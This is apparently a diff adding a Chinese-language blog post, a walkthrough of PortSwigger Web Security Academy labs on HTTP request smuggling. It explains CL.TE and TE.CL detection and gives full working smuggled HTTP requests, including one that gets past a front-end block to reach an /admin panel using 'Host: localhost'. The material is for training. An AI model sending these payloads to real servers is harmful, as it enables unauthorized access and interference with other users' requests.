@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"secdroid.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 HTTP 请求走私（HTTP Request Sm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burp Web Academy HTTP 请求走私">
+<meta property="og:url" content="https://secdroid.github.io/2025/01/21/burp-web-academy-http-request-smuggling/index.html">
+<meta property="og:site_name" content="SecDroid">
+<meta property="og:description" content="0x01. PortSwigger Web Security AcademyPortSwigger Web Security Academy 是 Burp Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。 本篇文章讲解 Web Security Academy 之中的 HTTP 请求走私（HTTP Request Sm">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-21T15:00:01.853Z">
+<meta property="article:modified_time" content="2025-01-21T14:59:00.000Z">
+<meta property="article:author" content="Livermore">
+<meta property="article:tag" content="Burp">
+<meta property="article:tag" content="HTTP Request Smuggling">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://secdroid.github.io/2025/01/21/burp-web-academy-http-request-smuggling/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://secdroid.github.io/2025/01/21/burp-web-academy-http-request-smuggling/","path":"2025/01/21/burp-web-academy-http-request-smuggling/","title":"Burp Web Academy HTTP 请求走私"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Burp Web Academy HTTP 请求走私 | SecDroid</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">SecDroid</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A security researcher who's looking for a job</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-PortSwigger-Web-Security-Academy"><span class="nav-number">1.</span> <span class="nav-text">0x01. PortSwigger Web Security Academy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-number">2.</span> <span class="nav-text">0x02. HTTP 请求走私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Lab-HTTP-request-smuggling-confirming-a-CL-TE-vulnerability-via-differential-responses"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Lab-HTTP-request-smuggling-confirming-a-TE-CL-vulnerability-via-differential-responses"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-CL-TE-vulnerability"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-TE-CL-vulnerability"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lab-Exploiting-HTTP-request-smuggling-to-reveal-front-end-request-rewriting"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Lab-Exploiting-HTTP-request-smuggling-to-capture-other-users%E2%80%99-requests"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 Lab: Exploiting HTTP request smuggling to capture other users’ requests</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Lab-Exploiting-HTTP-request-smuggling-to-deliver-reflected-XSS"><span class="nav-number">2.7.</span> <span class="nav-text">2.7 Lab: Exploiting HTTP request smuggling to deliver reflected XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">0x03. 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.</span> <span class="nav-text">0x04. 参考文档</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Livermore</p>
+  <div class="site-description" itemprop="description">SecDroid's Diary</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://secdroid.github.io/2025/01/21/burp-web-academy-http-request-smuggling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Livermore">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SecDroid">
+      <meta itemprop="description" content="SecDroid's Diary">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Burp Web Academy HTTP 请求走私 | SecDroid">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Burp Web Academy HTTP 请求走私
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-01-21 23:00:01 / 修改时间：22:59:00" itemprop="dateCreated datePublished" datetime="2025-01-21T23:00:01+08:00">2025-01-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/" itemprop="url" rel="index"><span itemprop="name">Vulnerability</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Vulnerability/Web/Burp-Web-Academy/" itemprop="url" rel="index"><span itemprop="name">Burp Web Academy</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x01-PortSwigger-Web-Security-Academy"><a href="#0x01-PortSwigger-Web-Security-Academy" class="headerlink" title="0x01. PortSwigger Web Security Academy"></a>0x01. PortSwigger Web Security Academy</h2><p>PortSwigger Web Security Academy 是 <a href="https://secdroid.github.io/tags/Burp/">Burp</a> Suite 官方推出的免费 Web 安全学习靶场，在学习 Web 安全知识的同时，还可以练习 Burp Suite 的实战技能。</p>
+<p>本篇文章讲解 <a href="https://secdroid.github.io/categories/Vulnerability/Web/Burp-Web-Academy/">Web Security Academy</a> 之中的 HTTP 请求走私（HTTP Request Smuggling）章节。</p>
+<span id="more"></span>
+
+<h2 id="0x02-HTTP-请求走私"><a href="#0x02-HTTP-请求走私" class="headerlink" title="0x02. HTTP 请求走私"></a>0x02. HTTP 请求走私</h2><h3 id="2-1-Lab-HTTP-request-smuggling-confirming-a-CL-TE-vulnerability-via-differential-responses"><a href="#2-1-Lab-HTTP-request-smuggling-confirming-a-CL-TE-vulnerability-via-differential-responses" class="headerlink" title="2.1 Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses"></a>2.1 Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
+<p>To solve the lab, smuggle a request to the back-end server, so that a subsequent request for <code>/</code> (the web root) triggers a 404 Not Found response.</p>
+</blockquote>
+<p>第一次学习 HTTP 请求走私，直接看官方答案解题：尽管题目已经提示前端服务器不支持 <code>Transfer-Encoding</code>，但我们还是按照常规思路测试一下。发送如下 POST 请求（注意，在 Burp Repeater 中，要在 Inspector 中把 HTTP 协议设置为 <code>HTTP/1</code>）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a9b00690310f9b180b8c6080055008f.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"></span><br><span class="line"><span class="language-vim"><span class="number">2</span></span></span><br><span class="line"><span class="language-vim"><span class="keyword">ab</span></span></span><br></pre></td></tr></table></figure>
+
+<p>注意这里的 BODY 内容为 <code>2\r\nab</code> 共 <code>5</code> 字节数据，对 <code>Content-Length</code> 而言是正确的，但是对于 <code>Transfer-Encoding</code> 而言是错误的。因此，可以根据服务器的返回状态来判断：</p>
+<ul>
+<li>如果正常返回，表明是 CL-CL（发送 <code>2\r\nab</code> 共 <code>5</code> 字节数据，和 <code>Content-Length</code> 匹配）</li>
+<li>如果提示超时，表明是 CL-TE，前端服务器正常转发 <code>2\r\nab</code>，后端服务器则没有等到 <code>Transfer-Encoding</code> 的结束标志 <code>0\r\n\r\n</code></li>
+<li>如果请求被拒绝，那么有两种可能（在前端服务器因为 <code>Transfer-Encoding</code> 不正确被拦截）<ul>
+<li>TE-TE</li>
+<li>TE-CL</li>
+</ul>
+</li>
+</ul>
+<p>测试下来，服务器返回 <code>500</code> 提示超时，因此是 CL-TE。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">500</span> Internal Server Error</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>125</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Server Error: Proxy error<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Server Error: Communication timed out<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>先发送如下 POST 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a9b00690310f9b180b8c6080055008f.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Ignore: X</span></span><br></pre></td></tr></table></figure>
+
+<p>注意 BODY 内容为 <code>0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X</code> 共 <code>35</code> 字节数据，因此前端服务器正常转发数据，而后端服务器则按照 <code>Transfer-Encoding: chunked</code> 来解析数据，因此 <code>GET /404 HTTP/1.1\r\nX-Ignore: X</code> 会被当做第二个请求的开头部分。注意，<code>X-Ignore: X</code> 末尾没有 <code>\r\n</code>，这是为了屏蔽下一个正常请求的 <code>GET</code> 行，以便服务器认为请求行是 <code>GET /404 HTTP/1.1</code>。</p>
+<p>因此，接下来发送一个正常的 <code>GET</code> 请求，即可触发服务器返回 <code>404</code> 了，请求会拼接如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-Ignore</span><span class="punctuation">: </span>XGET / HTTP/1.1</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Lab-HTTP-request-smuggling-confirming-a-TE-CL-vulnerability-via-differential-responses"><a href="#2-2-Lab-HTTP-request-smuggling-confirming-a-TE-CL-vulnerability-via-differential-responses" class="headerlink" title="2.2 Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses"></a>2.2 Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding.</p>
+<p>To solve the lab, smuggle a request to the back-end server, so that a subsequent request for <code>/</code> (the web root) triggers a 404 Not Found response.</p>
+</blockquote>
+<p>前面总结了一套测试方法，但是对于后端服务器使用哪个字段还无法确定，其实也是可以测试出来的：</p>
+<ul>
+<li>Payload：CL 正确 + TE 错误<ul>
+<li>正常返回，表明前端服务器、后端服务器均使用 CL</li>
+<li>返回 5XX 提示超时，表明前端服务器使用 CL，后端服务器使用 TE</li>
+<li>返回 4XX，表示请求被拒绝，表明前端服务器使用 TE，后端服务器需要进一步测试<ul>
+<li>Payload：TE 正确 + CL 错误<ul>
+<li>正常返回，表明后端服务器使用 TE</li>
+<li>提示超时，表明后端服务器使用 CL</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>因此，我们可以测试出来题目中提示的 TE-CL 场景。同时，Burp Repeater 默认会自动更新 <code>Content-Length</code> 字段，因此在测试时需要取消该设置。</p>
+<p>发送如下 POST 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a1900d40490a8d68199e81100eb0020.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">69</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">0</span>a1900d40490a8d68199e81100eb0020.web-security-academy.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">10</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>
+
+<p>首先，对 <code>Transfer-Encoding: chunked</code> 而言这个请求是合法的，因此前端服务器可以正常将请求转发给后端服务器。而对后端服务器而言，<code>Content-Length: 4</code> 导致第二个 <code>POST</code> 被当作下一个请求处理。需要注意的是，第二个 <code>Content-Length</code> 字段一定要设置的比实际的数据大，这样这个请求才是不完整的，需要等到用户真正发送第二个请求时，后端服务器才会在 <code>Content-Length</code> 指定的数据读取完毕时返回 <code>404</code>。</p>
+<h3 id="2-3-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-CL-TE-vulnerability"><a href="#2-3-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-CL-TE-vulnerability" class="headerlink" title="2.3 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"></a>2.3 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at <code>/admin</code>, but the front-end server blocks access to it.</p>
+<p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user <code>carlos</code>.</p>
+</blockquote>
+<p>前端服务器对 URL 有权限检查，但是不支持 TE 字段。</p>
+<p>直接访问 <code>/admin</code>，会返回 <code>403</code> 并提示 <code>&quot;Path /admin is blocked&quot;</code>。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/2</span> <span class="number">403</span> Forbidden</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>24</span><br><span class="line"></span><br><span class="line"><span class="language-1c"><span class="string">&quot;Path /admin is blocked&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>先发送 CL-TE Payload 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af7005b030f639390c2fe6700c7000c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=QwrIqIQosCclQzinLiNFOxAc28gt0IsF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-Ignore: X</span></span><br></pre></td></tr></table></figure>
+
+<p>然后发送正常的 <code>GET /</code> 请求，返回 <code>401</code> 并提示 <code>Admin interface only available to local users</code>。看来还要模拟成本地用户来访问，需要改进 Payload：</p>
+<ul>
+<li>尝试 <code>X-Forwarded-For: 127.0.0.1</code>，不行</li>
+<li>尝试 <code>X-Forwarded-Host: localhost</code>，也不行</li>
+<li>尝试 <code>Host: localhost</code>，可以，但是为了屏蔽后续的 Host 字段，需要改成 <code>POST</code> 请求发送</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af7005b030f639390c2fe6700c7000c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=QwrIqIQosCclQzinLiNFOxAc28gt0IsF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span></span></span><br></pre></td></tr></table></figure>
+
+<p>然后发送正常的 <code>GET /</code> 请求，即可看到页面的 HTML 代码：</p>
